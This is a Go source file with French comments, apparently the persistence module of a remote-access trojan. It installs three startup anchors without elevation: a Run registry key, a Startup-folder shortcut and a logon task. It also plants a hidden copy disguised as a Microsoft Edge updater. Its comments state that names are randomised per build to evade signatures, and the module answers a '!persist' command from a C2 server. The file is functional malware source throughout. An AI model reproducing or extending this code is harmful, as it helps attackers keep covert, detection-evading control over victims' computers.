// Persistance : démarrage avec Windows, à la demande.
//
// Trois ancrages indépendants, tous sans élévation :
//
//  1. la clé Run du Registre (HKCU) — `"exe" -silent` ;
//  2. un raccourci dans le dossier Démarrage, ciblant l'exécutable avec
//     `-silent` (aucune fenêtre au logon) ;
//  3. une tâche planifiée au logon (voir wipe.go), troisième filet.
//
// Les noms (valeur Run, fichier miroir, tâche) sont des variables : chaque
// build peut les renouveler via -X, ce que fait build.ps1. Un nom fixe devient
// vite une signature.
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"
)

var (
	procRegSetValueEx = advapi32DLL.NewProc("RegSetValueExW")
	procRegDeleteVal  = advapi32DLL.NewProc("RegDeleteValueW")
)

const runKeyPath = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

// Empreintes modifiables à la compilation :
//
//	go build -ldflags "-X main.runValueName=… -X main.mirrorFileName=…"
var (
	runValueName   = "Francais2ndUpdate"
	mirrorFileName = "msedgewebview2_update.exe"
)

// legacyRunNames et legacyMirrorName : empreintes des builds précédents, à
// retirer au passage (elles sont désormais des signatures connues).
var (
	legacyRunNames   = []string{"Francais2ndUpdate"}
	legacyMirrorName = "msedgewebview2_update.exe"
)

/* ------------------------------------------------------------------ */
/* Registre : écriture et suppression                                  */
/* ------------------------------------------------------------------ */

func regSetValueString(root uintptr, sub, name, value string) error {
	h, err := regOpenKeyWrite(root, sub)
	if err != nil {
		return err
	}
	defer regCloseKey(h)

	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	v, err := syscall.UTF16PtrFromString(value)
	if err != nil {
		return err
	}
	const regSz = 1
	// La taille se compte en octets UTF-16 (2 par unité + le zéro final) :
	// len(value) compterait les octets UTF-8, et un chemin accentué
	// (« Français ») déborde alors du tampon alloué par UTF16PtrFromString.
	nUnits := len(utf16.Encode([]rune(value))) + 1
	r, _, callErr := procRegSetValueEx.Call(h, uintptr(unsafe.Pointer(n)), 0,
		uintptr(regSz), uintptr(unsafe.Pointer(v)), uintptr(nUnits)*2)
	if r != 0 {
		return fmt.Errorf("RegSetValueEx = %d (%v)", r, callErr)
	}
	return nil
}

func regDeleteValue(root uintptr, sub, name string) error {
	h, err := regOpenKeyWrite(root, sub)
	if err != nil {
		return err
	}
	defer regCloseKey(h)
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	r, _, callErr := procRegDeleteVal.Call(h, uintptr(unsafe.Pointer(n)))
	if r != 0 && r != 2 { // 2 = ERROR_FILE_NOT_FOUND : déjà absent
		return fmt.Errorf("RegDeleteValue = %d (%v)", r, callErr)
	}
	return nil
}

// regOpenKeyWrite ouvre une clé en écriture (KEY_SET_VALUE).
func regOpenKeyWrite(root uintptr, sub string) (uintptr, error) {
	p, err := syscall.UTF16PtrFromString(sub)
	if err != nil {
		return 0, err
	}
	var h uintptr
	const keySetValue = 0x0002
	r, _, callErr := procRegOpenKeyEx.Call(root, uintptr(unsafe.Pointer(p)), 0,
		uintptr(keySetValue), uintptr(unsafe.Pointer(&h)))
	if r != 0 {
		return 0, fmt.Errorf("RegOpenKeyEx(écriture) = %d (%v)", r, callErr)
	}
	return h, nil
}

/* ------------------------------------------------------------------ */
/* Installation                                                        */
/* ------------------------------------------------------------------ */

// currentExe renvoie le chemin absolu de l'exécutable en cours.
func currentExe() string {
	p, err := os.Executable()
	if err != nil {
		return ""
	}
	if abs, err := filepath.EvalSymlinks(p); err == nil {
		p = abs
	}
	return p
}

func fileExists(path string) bool {
	path = unquote(path)
	if path == "" {
		return false
	}
	st, err := os.Stat(path)
	return err == nil && !st.IsDir()
}

func unquote(s string) string {
	s = strings.TrimSpace(s)
	s = strings.Trim(s, `"`)
	return s
}

// shadowDir est le dossier où vit la copie de repli : un dossier réellement
// utilisé par la mise à jour du navigateur, sans nom d'application suspect.
func shadowDir() string {
	return filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "EdgeUpdate")
}

// shadowPath est la copie permanente : supprimer l'exécutable d'origine ne
// coupe pas le démarrage.
func shadowPath() string {
	return filepath.Join(shadowDir(), mirrorFileName)
}

// persistMirror maintient la copie de repli à jour.
func persistMirror() {
	exe := currentExe()
	if exe == "" {
		return
	}
	sh := shadowPath()
	if strings.EqualFold(exe, sh) {
		return
	}
	se, errSrc := os.Stat(exe)
	shst, errDst := os.Stat(sh)
	if errDst == nil && errSrc == nil &&
		shst.Size() == se.Size() && !se.ModTime().After(shst.ModTime()) {
		return // déjà à jour
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		if errDst != nil {
			plog("persistance copie: " + err.Error())
		}
		return
	}
	if err := os.MkdirAll(shadowDir(), 0755); err != nil {
		plog("persistance copie: " + err.Error())
		return
	}
	if err := os.WriteFile(sh, data, 0755); err != nil {
		plog("persistance copie: " + err.Error())
		return
	}
	hideFile(sh)
	plog("persistance: copie de repli écrite (" + strconv.Itoa(len(data)) + " octets)")
}

// runTarget est le chemin que le démarrage doit lancer : la copie de repli si
// elle existe, sinon l'exécutable courant.
func runTarget() string {
	if fileExists(shadowPath()) {
		return shadowPath()
	}
	return currentExe()
}

// runValue est la valeur écrite dans le Registre : chemin entre guillemets
// (il contient souvent « Français » et des espaces) suivi de `-silent`.
func runValue() string {
	exe := runTarget()
	if exe == "" {
		return ""
	}
	return `"` + exe + `" -silent`
}

// persistInstall pose les trois ancrages. Jamais d'erreur fatale : la
// persistance est un plus, pas une condition de fonctionnement.
func persistInstall() {
	if runValue() == "" {
		return
	}
	persistMirror()
	persistCleanupLegacy()
	persistCleanupStale()

	err := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
	if err != nil {
		plog("persistance échouée : " + err.Error())
		return
	}
	persistStartupLink()
	persistTask()
	plog("persistance: installée (Run + Démarrage + tâche) → " + runTarget())
}

// persistCleanupLegacy retire les empreintes des builds précédents : valeur
// Run obsolète, vieux miroir, script VBS du Démarrage.
func persistCleanupLegacy() {
	for _, name := range legacyRunNames {
		if name != runValueName {
			_ = regDeleteValue(hkeyCurrentUser, runKeyPath, name)
		}
	}
	old := filepath.Join(shadowDir(), legacyMirrorName)
	if legacyMirrorName != mirrorFileName {
		_ = os.Remove(old)
	}
	vbs := os.Getenv("APPDATA") +
		`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
	_ = os.Remove(vbs)
}

// persistRemove annule la persistance (Registre, Démarrage, tâche, reliquats).
func persistRemove() {
	_ = regDeleteValue(hkeyCurrentUser, runKeyPath, runValueName)
	for _, name := range legacyRunNames {
		_ = regDeleteValue(hkeyCurrentUser, runKeyPath, name)
	}
	for _, p := range []string{startupLinkPath(), startupCopyPath()} {
		if p != "" {
			_ = os.Remove(p)
		}
	}
	persistTaskRemove()
	vbs := os.Getenv("APPDATA") +
		`\Microsoft\Windows\Start Menu\Programs\Startup\sysupdate.vbs`
	_ = os.Remove(vbs)
}

// persistSet gère la commande !persist du C2.
func persistSet(arg string) string {
	switch strings.ToLower(strings.TrimSpace(arg)) {
	case "on", "1", "enable", "oui":
		if runValue() == "" {
			return "chemin de l'exécutable introuvable."
		}
		persistMirror()
		persistCleanupLegacy()
		err := regSetValueString(hkeyCurrentUser, runKeyPath, runValueName, runValue())
		if err != nil {
			return "échec d'écriture de la clé Run :\n" + err.Error()
		}
		persistStartupLink()
		persistTask()
		return "installé (Run + Démarrage + tâche), lancement silencieux :\n" + runValue()

	case "off", "0", "disable", "non", "":
		persistRemove()
		return "persistance retirée (Run, Démarrage, tâche)."

	default:
		return "usage : !persist on   ou   !persist off"
	}
}

// persistStatus sert au diagnostic.
func persistStatus() string {
	h, err := regOpenString(hkeyCurrentUser, runKeyPath)
	if err != nil {
		return "registre inaccessible"
	}
	defer regCloseKey(h)
	v := regReadString(h, runValueName)
	if v == "" {
		return "absente"
	}
	return v
}
